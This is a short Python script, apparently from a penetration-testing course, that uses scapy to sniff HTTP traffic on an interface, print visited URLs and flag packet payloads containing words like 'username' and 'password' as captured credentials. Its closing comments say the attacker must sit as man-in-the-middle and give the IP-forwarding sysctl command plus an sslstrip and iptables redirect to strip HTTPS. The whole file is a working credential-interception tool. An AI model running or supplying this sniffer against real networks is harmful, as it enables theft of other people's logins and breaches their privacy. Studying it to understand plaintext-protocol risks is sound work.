#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http       #to import http module from scapy.layers.



def sniff(interface):
    scapy.sniff(iface=interface, store=False,prn=process_sniffed_packet)    #sniff is a function within sniff. for each packet captured
                                   # process_sniffed_packet is called to process the packet. #sniff can take a argument called filter="", eg,arp,tcp,udp port 22,but no http.

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path  #to list the url visited.


def get_logininfo(packet):
    if packet.haslayer(scapy.Raw):  # checking if the http packet found has a raw(username&passwd) layer within HTTP layer
        load = packet[scapy.Raw].load
        # print(load)
        keywords = ["username", "password", "login", "passwd", "uname"]
        for keyword in keywords:
            rm = bytes(keyword,'utf-8')  # converting the comparison string into byte character for using it in the if statement.
            if rm in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):   #has layer is a method implemented by scapy to check if the packet has HTTP layer.
                                            #we can also check the packet has tcp,ethernet layer etc
        #print(packet.show())               #to view the packet and analyse the field that has url data.
        url = get_url(packet)
        print("[+]Http request URL >>" + str(url))

        login_info= get_logininfo(packet)
        if login_info:
                print("\n\n[+]Possible username password >>"+ str(login_info) + " \n\n")

            #if b"uname" in load:            #b before the string to treat is a byte value


sniff("eth0")                       #enter your interface to monitor.

#COMMENTS
#attacker should be man in the middle. and allow passing all the packets.
#command to allow passing all the packets - "sysctl -w net.ipv4.ip_forward=1"

#to test against https website:
#1. run sslstrip in a new command line.
#2.iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
